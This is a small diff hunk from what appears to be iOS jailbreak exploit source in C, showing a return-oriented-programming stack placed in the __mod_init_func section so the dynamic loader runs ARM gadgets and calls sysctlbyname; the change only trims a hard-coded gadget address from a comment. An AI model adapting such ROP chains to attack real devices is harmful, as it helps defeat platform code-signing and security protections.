@@ -17,7 +17,7 @@ unsigned int __attribute__((section("__LOL,__lol"))) lol[2]={0x1,CONFIG_K103}; /
 
 //=> R7=myROPStack but we need to have dyld loop another time without crahsing, next initializer is in lol[2]
 unsigned int __attribute__((section("__DATA,__mod_init_func"))) myROPStack[0x1000]={
-        CONFIG_K101,//0x3117E1A0,                     //pop {r6,r7}; bx lr
+        CONFIG_K101,                    //pop {r6,r7}; bx lr
         CONFIG_K11,                     //pop {r4-r7, pc}
         sysctlbyname,
         5,
